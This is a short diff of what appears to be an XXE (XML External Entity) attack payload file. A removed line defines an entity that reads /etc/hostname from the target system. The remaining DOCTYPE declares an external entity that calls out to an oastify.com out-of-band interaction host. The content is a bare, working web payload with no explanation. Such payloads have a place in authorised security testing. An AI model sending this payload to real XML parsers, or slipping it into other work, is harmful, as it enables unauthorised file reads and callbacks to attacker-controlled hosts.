@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://2wzr244tylfsp3aa5cqj6uqi1970vrjg.oastify.com" > ]>
